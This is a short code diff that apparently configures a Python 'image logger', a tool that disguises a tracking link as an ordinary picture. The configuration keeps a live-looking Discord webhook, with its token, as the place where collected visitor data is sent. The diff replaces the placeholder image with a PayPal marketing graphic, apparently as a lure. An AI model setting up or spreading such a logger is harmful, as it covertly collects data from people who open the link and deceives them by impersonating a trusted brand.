@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335645196066492616/qZpdhX9BqlmOFP8PPuorhQa3B_LBE4TFkk_MCev0EQ-BkvoyaVs6bwLxuUGvfcJfDZx9",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://www.paypalobjects.com/digitalassets/c/website/marketing/latam/shared/merchant-integration/2018_redesign/context/img_shop-balance_2x.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
